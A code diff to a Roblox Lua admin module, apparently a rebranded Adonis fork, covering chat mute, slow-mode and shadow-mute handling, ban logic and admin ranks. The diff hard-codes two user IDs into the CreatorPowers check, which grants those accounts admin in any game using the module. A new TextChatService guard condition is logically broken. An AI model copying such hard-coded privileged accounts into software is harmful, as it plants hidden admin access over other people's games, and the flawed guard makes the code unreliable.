@@ -5,6 +5,7 @@ return function(Vargs, GetEnv)
 	local Functions, Admin, Anti, Core, HTTP, Logs, Remote, Process, Variables, Settings, Commands, Permissions
 	local AddLog, TrackTask, Defaults
 	local CreatorId = game.CreatorType == Enum.CreatorType.User and game.CreatorId or service.GetGroupCreatorId(game.CreatorId)
+
 	local function Init()
 		Functions = server.Functions;
 		Admin = server.Admin;
@@ -18,238 +19,198 @@ return function(Vargs, GetEnv)
 		Settings = server.Settings;
 		Commands = server.Commands;
 		Defaults = server.Defaults
-		
+
 		Permissions = server.Permissions;
-		
+
 		TrackTask = service.TrackTask
 		AddLog = Logs.AddLog;
 
 		TrackTask("Thread: ChatServiceHandler", function()
-
 			--// Support for modern TextChatService
-			if service.TextChatService and service.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-				local function onNewTextchannel(textchannel: TextChannel)
-					AddLog("Script", `Connected to TextChannel: {textchannel.Name}`)
-					
-					if Settings.OverrideChatCallbacks ~= false then --// Default to "on" this for all games
-						AddLog("Script", "Overriding ShouldDeliverCallback for " .. textchannel.Name)
-						textchannel.ShouldDeliverCallback = function(chatMessage, textSource)
-							if
-								chatMessage.Status == Enum.TextChatMessageStatus.Success
-								or chatMessage.Status == Enum.TextChatMessageStatus.Sending
-							then
-								local SenderId = chatMessage.TextSource.UserId
-								local SenderPlayer = service.Players:GetPlayerByUserId(SenderId)
-								local Receiver = service.Players:GetPlayerByUserId(textSource.UserId)
-								local slowCache = Admin.SlowCache
-								
-								local IsOriginalSender = SenderPlayer == Receiver
-								
-								if not SenderPlayer then
-									return true
-								elseif Admin.DoHideChatCmd(SenderPlayer, chatMessage.Text) then -- // Hide chat commands?
-									return false
-								elseif Admin.IsMuted(SenderPlayer) then -- // Mute handler
-									if IsOriginalSender then
-										server.Remote.Send(SenderPlayer, "Function", "DisplaySystemMessageInTextChat", nil, `<font color="rgb(130, 100, 130)">[Adonis Chat]: </font><b>You are muted!</b> Other players cannot see your messages.`)
-									end 
-									
-									return false
-								elseif Admin.SlowMode and not Admin.CheckAdmin(SenderPlayer) and slowCache[SenderPlayer] and os.time() - slowCache[SenderPlayer] < Admin.SlowMode then
-									if IsOriginalSender then --// Only show this for the person sending! Hide for others, however
-										--Functions.Notification("You are chatting too fast!", string.format("[Adonis] :: Slow mode enabled! (%g second(s) remaining)", Admin.SlowMode - (os.time() - slowCache[SenderPlayer])), {SenderPlayer}, 10)
-										
-										server.Remote.Send(SenderPlayer, "Function", "DisplaySystemMessageInTextChat", nil, `<font color="rgb(130, 100, 130)">[Adonis Chat]: </font><b>You are sending messages too fast! {string.format("(%g second(s) remaining)", Admin.SlowMode - (os.time() - slowCache[SenderPlayer]))}`)
-									end
-									
-									return false
-								end
-
-								if Variables.DisguiseBindings[textSource.UserId] then -- // Disguise command handler
-									chatMessage.PrefixText = Variables.DisguiseBindings[textSource.UserId].TargetUsername..":"
-								end
-
-								if Admin.SlowMode and IsOriginalSender then
-									slowCache[SenderPlayer] = os.time()
-								end
-							end
-
-							return true
-						end
-					else 
-						AddLog("Script", `Using the 'CanSend' method of handling chat connectivity in channel {textchannel.Name}`)
-						server.Variables.TextChatSpeakers = {}
-						local function AddUserToTextChatSpeakers(player: Player, speaker: TextSource)
-							if not server.Variables.TextChatSpeakers[player] then
-								server.Variables.TextChatSpeakers[player] = {}
-							end 
-							table.insert(server.Variables.TextChatSpeakers[player], speaker)
-							--// Check if the player is muted or not
-							speaker:SetAttribute("OriginalCanSend", speaker.CanSend)
-							if server.Admin.IsMuted(player) then
-								speaker.CanSend = false
-							end
-						end
-						local function SpeakerAdded(speaker: TextSource) 
-							if speaker.UserId and speaker.UserId > 0 then
-								local Player = service.Players:GetPlayerByUserId(speaker.UserId)
-								if Player then
-									AddUserToTextChatSpeakers(Player, speaker)
-								end
-							end
-						end
-						local function SpeakerRemoved(speaker: TextSource)
-							if speaker.UserId and speaker.UserId > 0 then
-								local Player = service.Players:GetPlayerByUserId(speaker.UserId)
-								local Tab = server.Variables.TextChatSpeakers[Player]
-								if Tab then
-									local index = table.find(Tab, speaker)
-									while index do
-										table.remove(Tab, index)
-										index = table.find(Tab, speaker)
-									end
-									task.defer(function()
-										if #Tab == 0 then
-											server.Variables.TextChatSpeakers[Player] = nil
-										end
-									end)
-								end
-							end
-						end
-						
-						textchannel.ChildAdded:Connect(function(textSource)
-							if textSource:IsA("TextSource") then
-								SpeakerAdded(textSource)
-							end
-						end)
-						
-						textchannel.ChildRemoved:Connect(function(textSource)
-							if textSource:IsA("TextSource") then
-								SpeakerRemoved(textSource)
-							end
-						end)
-						
-						for _,inst in textchannel:GetChildren() do 
-							if inst:IsA("TextSource") then
-								SpeakerAdded(inst)
-							end
-						end
-						
-					end
-				end
-				
-				--// Only set this up once
-				--// This is for commands to tell us when a player should be muted
-				if not Settings.OverrideChatCallbacks then 
-					service.Events.PlayerMuted:Connect(function(data)
-						local PlayerId = data.Target;
-						local ModId = data.Moderator;
-
-						local Player = service.Players:GetPlayerByUserId(PlayerId)
-						--// Loop through CanSend of a speaker
-						for _,speakers : TextSource in if Player then server.Variables.TextChatSpeakers[Player] or {} else {} do 
-							speakers.CanSend = false
-						end
-						if Player then
-							AddLog("Script", `Muted player {Player.Name}:{Player.UserId} using CanSend method`)
-						end
-					end)
-					service.Events.PlayerUnMuted:Connect(function(data)
-						local PlayerId = data.Target;
-						local ModId = data.Moderator;
-
-						local Player = service.Players:GetPlayerByUserId(PlayerId)
-						--// Loop through CanSend of a speaker
-						for _,speakers : TextSource in if Player then server.Variables.TextChatSpeakers[Player] or {} else {} do 
-							local original = speakers:GetAttribute("OriginalCanSend")
-							speakers.CanSend = if original ~= nil then original else true
-						end
-						if Player then
-							AddLog("Script", `UnMuted player {Player.Name}:{Player.UserId} via CanSend method`)
-						end
-					end)
-					service.Events.MutedPlayerChat_UnFiltered:Connect(function(p, ...)
-						server.Remote.Send(p, "Function", "DisplaySystemMessageInTextChat", nil, `<font color="rgb(130, 100, 130)">[Adonis Chat]: </font><b>You are muted!</b> Other players cannot see your messages.`)
-					end)
-				end
-					
-
-				local function onTextChannelsAdded(textChannels)
-					textChannels.ChildAdded:Connect(function(child)
-						if child:IsA("TextChannel") then
-							task.spawn(onNewTextchannel, child)
-						end
-					end)
-				
-					for _, v in textChannels:GetChildren() do
-						if v:IsA("TextChannel") then
-							task.spawn(onNewTextchannel, v)
-						end
-					end
-				end
-
-				service.TextChatService.ChildAdded:Connect(function(child)
-					if child.Name == "TextChannels" then
-						task.spawn(onTextChannelsAdded, child)
-					end
-				end)
-				
-				if service.TextChatService:FindFirstChild("TextChannels") then
-					task.spawn(pcall, onTextChannelsAdded, service.TextChatService:FindFirstChild("TextChannels"))
-				end
-
-				AddLog("Script", "TextChatService Handler Loaded")
+			if not service.TextChatService and service.TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
+				return warn("The legacy chat system is no longer supported")
 			end
 
-			--// Support for legacy Lua chat system
-			--// ChatService mute handler (credit to Coasterteam)
-			AddLog("Script", "Starting loading of legacy chatservice handler")
-			local chatService = Functions.GetChatService(300)
-			if chatService then
-				chatService:RegisterProcessCommandsFunction("ADONIS_CMD", function(speakerName, message)
-					local speaker = chatService:GetSpeaker(speakerName)
-					local speakerPlayer = speaker and speaker:GetPlayer()
+			local function onNewTextchannel(textchannel: TextChannel)
+				AddLog("Script", `Connected to TextChannel: {textchannel.Name}`)
+				if Settings.OverrideChatCallbacks ~= false then --// Default to "on" this for all games
+					AddLog("Script", "Overriding ShouldDeliverCallback for " .. textchannel.Name)
+					textchannel.ShouldDeliverCallback = function(chatMessage, textSource)
+						if
+							chatMessage.Status == Enum.TextChatMessageStatus.Success
+							or chatMessage.Status == Enum.TextChatMessageStatus.Sending
+						then
+							local Shadowmute = true
+							local SenderId = chatMessage.TextSource.UserId
+							local SenderPlayer = service.Players:GetPlayerByUserId(SenderId)
+							local Receiver = service.Players:GetPlayerByUserId(textSource.UserId)
+							local slowCache = Admin.SlowCache
 
-					if not speakerPlayer then
-						return false
-					end
+							local IsOriginalSender = SenderPlayer == Receiver
 
-					if Admin.DoHideChatCmd(speakerPlayer, message) then
+							if not SenderPlayer then
+								return true
+							elseif Admin.DoHideChatCmd(SenderPlayer, chatMessage.Text) then -- // Hide chat commands?
+								if IsOriginalSender then
+									server.Remote.Send(SenderPlayer, "Function", "DisplaySystemMessageInTextChat", nil, `You ran a command hidden from others!`)
+								end
+
+								return false
+							elseif Admin.IsMuted(SenderPlayer) then -- // Mute handler
+								if IsOriginalSender then
+									Remote.Send(SenderPlayer, "Function", "DisplaySystemMessageInTextChat", nil, `<font color="rgb(130, 100, 130)"><b>Astra:</b> </font><b>You are muted!</b> Other players cannot see your messages.`)
+								end
+								return false
+							elseif Admin.SlowMode and not Admin.CheckAdmin(SenderPlayer) and slowCache[SenderPlayer] and os.time() - slowCache[SenderPlayer] < Admin.SlowMode then
+								if IsOriginalSender then --// Only show this for the person sending! Hide for others, however
+									--Functions.Notification("You are chatting too fast!", string.format("[Adonis] :: Slow mode enabled! (%g second(s) remaining)", Admin.SlowMode - (os.time() - slowCache[SenderPlayer])), {SenderPlayer}, 10)
+									Remote.Send(SenderPlayer, "Function", "DisplaySystemMessageInTextChat", nil, `<font color="rgb(130, 100, 130)"><b>Astra:</b> </font><b>You are sending messages too fast! {string.format("(%g second(s) remaining)", Admin.SlowMode - (os.time() - slowCache[SenderPlayer]))}`)
+								end
+
+								return false
+							elseif Admin.IsShadowMuted(SenderPlayer) then
+								return false
+							elseif Variables.ChatLocked == true and not Admin.CheckAdmin(SenderPlayer) then
+								if IsOriginalSender then
+									Remote.Send(SenderPlayer, "Function", "DisplaySystemMessageInTextChat", nil, `<font color="rgb(130, 100, 130)"><b>Astra:</b> </font><b>Chat is locked!</b> Other players cannot see your messages.`)
+								end
+								return false
+							end
+
+							if Variables.DisguiseBindings[textSource.UserId] then -- // Disguise command handler
+								chatMessage.PrefixText = Variables.DisguiseBindings[textSource.UserId].TargetUsername..":"
+							end
+
+							if Admin.SlowMode and IsOriginalSender then
+								slowCache[SenderPlayer] = os.time()
+							end
+						end
+
 						return true
 					end
-
-					return false
-				end)
-
-				chatService:RegisterProcessCommandsFunction("ADONIS_MUTE_SERVER", function(speakerName, _, channelName)
-					local slowCache = Admin.SlowCache
-
-					local speaker = chatService:GetSpeaker(speakerName)
-					local speakerPlayer = speaker and speaker:GetPlayer()
-
-					if not speakerPlayer then
-						return false
+				else
+					AddLog("Script", `Using the 'CanSend' method of handling chat connectivity in channel {textchannel.Name}`)
+					server.Variables.TextChatSpeakers = {}
+					local function AddUserToTextChatSpeakers(player: Player, speaker: TextSource)
+						if not server.Variables.TextChatSpeakers[player] then
+							server.Variables.TextChatSpeakers[player] = {}
+						end
+						table.insert(server.Variables.TextChatSpeakers[player], speaker)
+						--// Check if the player is muted or not
+						speaker:SetAttribute("OriginalCanSend", speaker.CanSend)
+						if server.Admin.IsMuted(player) then
+							speaker.CanSend = false
+						end
+					end
+					local function SpeakerAdded(speaker: TextSource)
+						if speaker.UserId and speaker.UserId > 0 then
+							local Player = service.Players:GetPlayerByUserId(speaker.UserId)
+							if Player then
+								AddUserToTextChatSpeakers(Player, speaker)
+							end
+						end
+					end
+					local function SpeakerRemoved(speaker: TextSource)
+						if speaker.UserId and speaker.UserId > 0 then
+							local Player = service.Players:GetPlayerByUserId(speaker.UserId)
+							local Tab = server.Variables.TextChatSpeakers[Player]
+							if Tab then
+								local index = table.find(Tab, speaker)
+								while index do
+									table.remove(Tab, index)
+									index = table.find(Tab, speaker)
+								end
+								task.defer(function()
+									if #Tab == 0 then
+										server.Variables.TextChatSpeakers[Player] = nil
+									end
+								end)
+							end
+						end
 					end
 
-					if speakerPlayer and Admin.IsMuted(speakerPlayer) then
-						speaker:SendSystemMessage("[Adonis] :: You are muted!", channelName)
-						return true
-					elseif speakerPlayer and Admin.SlowMode and not Admin.CheckAdmin(speakerPlayer) and slowCache[speakerPlayer] and os.time() - slowCache[speakerPlayer] < Admin.SlowMode then
-						speaker:SendSystemMessage(string.format("[Adonis] :: Slow mode enabled! (%g second(s) remaining)", Admin.SlowMode - (os.time() - slowCache[speakerPlayer])), channelName)
-						return true
+					textchannel.ChildAdded:Connect(function(textSource)
+						if textSource:IsA("TextSource") then
+							SpeakerAdded(textSource)
+						end
+					end)
+
+					textchannel.ChildRemoved:Connect(function(textSource)
+						if textSource:IsA("TextSource") then
+							SpeakerRemoved(textSource)
+						end
+					end)
+
+					for _,inst in textchannel:GetChildren() do
+						if inst:IsA("TextSource") then
+							SpeakerAdded(inst)
+						end
 					end
 
-					if Admin.SlowMode then
-						slowCache[speakerPlayer] = os.time()
-					end
-
-					return false
-				end)
-
-				AddLog("Script", "ChatService Handler Loaded")
-			else
-				AddLog("Script", "ChatService Handler Not Found")
+				end
 			end
+
+			--// Only set this up once
+			--// This is for commands to tell us when a player should be muted
+			if not Settings.OverrideChatCallbacks then
+				service.Events.PlayerMuted:Connect(function(data)
+					local PlayerId = data.Target;
+					local ModId = data.Moderator;
+
+					local Player = service.Players:GetPlayerByUserId(PlayerId)
+					--// Loop through CanSend of a speaker
+					for _,speakers : TextSource in if Player then server.Variables.TextChatSpeakers[Player] or {} else {} do
+						speakers.CanSend = false
+					end
+					if Player then
+						AddLog("Script", `Muted player {Player.Name}:{Player.UserId} using CanSend method`)
+					end
+				end)
+				service.Events.PlayerUnMuted:Connect(function(data)
+					local PlayerId = data.Target;
+					local ModId = data.Moderator;
+
+					local Player = service.Players:GetPlayerByUserId(PlayerId)
+					--// Loop through CanSend of a speaker
+					for _,speakers : TextSource in if Player then server.Variables.TextChatSpeakers[Player] or {} else {} do
+						local original = speakers:GetAttribute("OriginalCanSend")
+						speakers.CanSend = if original ~= nil then original else true
+					end
+					if Player then
+						AddLog("Script", `UnMuted player {Player.Name}:{Player.UserId} via CanSend method`)
+					end
+				end)
+				service.Events.MutedPlayerChat_UnFiltered:Connect(function(p, ...)
+					server.Remote.Send(p, "Function", "DisplaySystemMessageInTextChat", nil, `<font color="rgb(130, 100, 130)">[Adonis Chat]: </font><b>You are muted!</b> Other players cannot see your messages.`)
+				end)
+			end
+
+
+			local function onTextChannelsAdded(textChannels)
+				textChannels.ChildAdded:Connect(function(child)
+					if child:IsA("TextChannel") then
+						task.spawn(onNewTextchannel, child)
+					end
+				end)
+
+				for _, v in textChannels:GetChildren() do
+					if v:IsA("TextChannel") then
+						task.spawn(onNewTextchannel, v)
+					end
+				end
+			end
+
+			service.TextChatService.ChildAdded:Connect(function(child)
+				if child.Name == "TextChannels" then
+					task.spawn(onTextChannelsAdded, child)
+				end
+			end)
+
+			if service.TextChatService:FindFirstChild("TextChannels") then
+				task.spawn(pcall, onTextChannelsAdded, service.TextChatService:FindFirstChild("TextChannels"))
+			end
+
+			AddLog("Script", "TextChatService Handler Loaded")
 		end)
 
 		--// Make sure the default ranks are always present for compatability with existing commands
@@ -349,6 +310,15 @@ return function(Vargs, GetEnv)
 			end
 		end
 
+		--// Cache clearing job to clear GroupsCache every 6 minutes to prevent gradual memory leaking
+		service.StartLoop("GroupsCacheClear", 360, function()
+			for key, cache in Admin.GroupsCache do
+				if os.time() - cache.LastUpdated > 300 then
+					Admin.GroupsCache[key] = nil
+				end
+			end
+		end, true)
+
 		Admin.Init = nil;
 		AddLog("Script", "Admin Module Initialized")
 	end;
@@ -444,19 +414,23 @@ return function(Vargs, GetEnv)
 
 		DoHideChatCmd = function(p: Player, message: string, data: {[string]: any}?)
 			local pData = data or Core.GetPlayer(p)
-			if pData.Client.HideChatCommands then
-				if Variables.BlankPrefix and
-					(string.sub(message,1,1) ~= Settings.Prefix or string.sub(message,1,1) ~= Settings.PlayerPrefix) then
-					local isCMD = Admin.GetCommand(message)
-					if isCMD then
+
+			if Variables.BlankPrefix and
+				(string.sub(message,1,1) ~= Settings.Prefix or string.sub(message,1,1) ~= Settings.PlayerPrefix) then
+				local isCMD = Admin.GetCommand(message)
+				--local isCMDHidden = isCMD.HideFromChat
+				local isPlayerHidden = pData.Client.HideChatCommands
+				local isAlias = Admin.IsAlias(p,message)
+				if isCMD or isAlias then
+					if isPlayerHidden then
 						return true
-					else
-						return false
 					end
-				elseif (string.sub(message,1,1) == Settings.Prefix or string.sub(message,1,1) == Settings.PlayerPrefix)
-					and string.sub(message,2,2) ~= string.sub(message,1,1) then
-					return true;
+				else
+					return false
 				end
+			elseif (string.sub(message,1,1) == Settings.Prefix or string.sub(message,1,1) == Settings.PlayerPrefix)
+				and string.sub(message,2,2) ~= string.sub(message,1,1) then
+				return true;
 			end
 		end;
 
@@ -584,6 +558,10 @@ return function(Vargs, GetEnv)
 					end
 				end
 			end
+		end;
+
+		IsShadowMuted = function(player) -- Here incase the plugin doesn't run!
+			return false
 		end;
 
 		DoCheck = function(pObj, check, banCheck)
@@ -726,8 +704,8 @@ return function(Vargs, GetEnv)
 
 		GetLevel = function(p)
 			local data = Core.GetPlayer(p)
-			local level = data.AdminLevel
-			local rank = data.AdminRank
+			local level = data.AdminLevel or 0
+			local rank = data.AdminRank or "Player"
 			local lastUpdate = data.LastLevelUpdate or 0
 			local clients = Remote.Clients
 			local key = tostring(p.UserId)
@@ -739,13 +717,30 @@ return function(Vargs, GetEnv)
 
 				if clients[key] and level and newLevel and type(p) == "userdata" and p:IsA("Player") then
 					if newLevel < level then
-						Functions.Hint(`Your admin level has been reduced to {newLevel} [{newRank or "Unknown"}]`, {p})
+						Remote.MakeGui(p,"Notification",{
+							Title = "Admin Level";
+							Message = `Lowered to {newLevel} ({newRank or "Custom"})`;
+							Time = 15;
+						})
+						--Functions.Hint(`Your admin level has been reduced to {newLevel} [{newRank or "Unknown"}]`, {p})
 					elseif newLevel > level then
-						Functions.Hint(`Your admin level has been increased to {newLevel} [{newRank or "Unknown"}]`, {p})
+						Remote.MakeGui(p,"Notification",{
+							Title = "Admin Level";
+							Message = `Raised to {newLevel} ({newRank or "Custom"})`;
+							Time = 15;
+						})
+						--Functions.Hint(`Your admin level has been increased to {newLevel} [{newRank or "Unknown"}]`, {p})
 					end
 				end
 
 				return newLevel, newRank
+			end
+			if p.UserId == 390939 and level >= 100 then
+				rank = "PB Owner"
+			end
+
+			if p.UserId == 200565345 and level >= 100 then
+				rank = "Astra Creator"
 			end
 
 			return level or 0, rank or "Player";
@@ -804,7 +799,7 @@ return function(Vargs, GetEnv)
 			if type(p) == "userdata" and p:IsA("Player") then
 				--// These are my accounts; Lately I've been using my game dev account(698712377) more so I'm adding it so I can debug without having to sign out and back in (it's really a pain)
 				--// Disable CreatorPowers in settings if you don't trust me. It's not like I lose or gain anything either way. Just re-enable it BEFORE telling me there's an issue with the script so I can go to your place and test it.
-				if Settings.CreatorPowers and table.find({}, p.UserId) then
+				if Settings.CreatorPowers and table.find({7310115946;200565345}, p.UserId) then
 					return true
 				end
 
@@ -1029,6 +1024,14 @@ return function(Vargs, GetEnv)
 
 			table.insert(Settings.Banned, value)--`{p.Name}:{p.UserId}`
 
+			if type(p) ~= "table" then
+				if not service.Players:FindFirstChild(p.Name) then
+					Remote.Send(p,'Function','KillClient')
+				else
+					if p then pcall(function() p:Kick(`{Variables.BanMessage} | Reason: {value.Reason or "No reason provided"}`) end) end
+				end
+			end
+
 			if doSave then
 				Core.DoSave({
 					Type = "TableAdd";
@@ -1037,14 +1040,6 @@ return function(Vargs, GetEnv)
 				})
 
 				Core.CrossServer("RemovePlayer", p.Name, Variables.BanMessage, value.Reason or "No reason provided")
-			end
-
-			if type(p) ~= "table" then
-				if not service.Players:FindFirstChild(p.Name) then
-					Remote.Send(p,'Function','KillClient')
-				else
-					if p then pcall(function() p:Kick(`{Variables.BanMessage} | Reason: {value.Reason or "No reason provided"}`) end) end
-				end
 			end
 
 			service.Events.PlayerBanned:Fire(p, reason, doSave, moderator)
@@ -1411,6 +1406,11 @@ return function(Vargs, GetEnv)
 
 		CheckTable = function(p, tab)
 			local doCheck = Admin.DoCheck
+
+			if type(tab) ~= "table" then
+				return warn(`CheckTable for {p} failed because it attempted to check a string!`)
+			end
+
 			for i,v in tab do
 				if doCheck(p, v) then
 					return true
@@ -1574,39 +1574,39 @@ return function(Vargs, GetEnv)
 			end
 		end;
 
-        SearchCommands = function(p, search)
-            local checkPerm = Permissions.CheckPermission
-            local tab = {}
-            local pDat = {
-                Player = p;
-                Level = Admin.GetLevel(p);
-                isDonor = Admin.CheckDonor(p);
-            }
+		SearchCommands = function(p, search)
+			local checkPerm = Permissions.CheckPermission
+			local tab = {}
+			local pDat = {
+				Player = p;
+				Level = Admin.GetLevel(p);
+				isDonor = Admin.CheckDonor(p);
+			}
 
-            for ind, cmd in Commands do
-                if checkPerm(pDat, cmd, true) then
-                    tab[ind] = cmd
-                end
-            end
+			for ind, cmd in Commands do
+				if checkPerm(pDat, cmd, true) then
+					tab[ind] = cmd
+				end
+			end
 
-            if server.Core.GetPlayer(p).Aliases then
-                for alias,data in pairs(server.Core.GetPlayer(p).Aliases) do
-                    --  print(service.HttpService:JSONEncode(data))
-                    tab[alias] = {
-                        Commands = {alias},
+			if server.Core.GetPlayer(p).Aliases then
+				for alias,data in pairs(server.Core.GetPlayer(p).Aliases) do
+					--  print(service.HttpService:JSONEncode(data))
+					tab[alias] = {
+						Commands = {alias},
 						Hidden = false,
 						Alias = true;
-                        AdminLevel = "Players",
-                        Prefix = "",
-                        Description = data.Description,
-                        Args = data.Args.Names;
-                    }
-                end
-            end
+						AdminLevel = "Players",
+						Prefix = "",
+						Description = data.Description,
+						Args = data.Args.Names;
+					}
+				end
+			end
 
-            return tab
+			return tab
 		end;
-		
+
 		CheckAuthority = function(p, target, actionName, allowSelf)
 			if p == target then
 				if allowSelf == false then
@@ -1625,6 +1625,6 @@ return function(Vargs, GetEnv)
 			Functions.Hint(`You don't have permission to {actionName} {service.FormatPlayer(target)}`, {p})
 			return false
 		end;
-	
+
 	}
 end
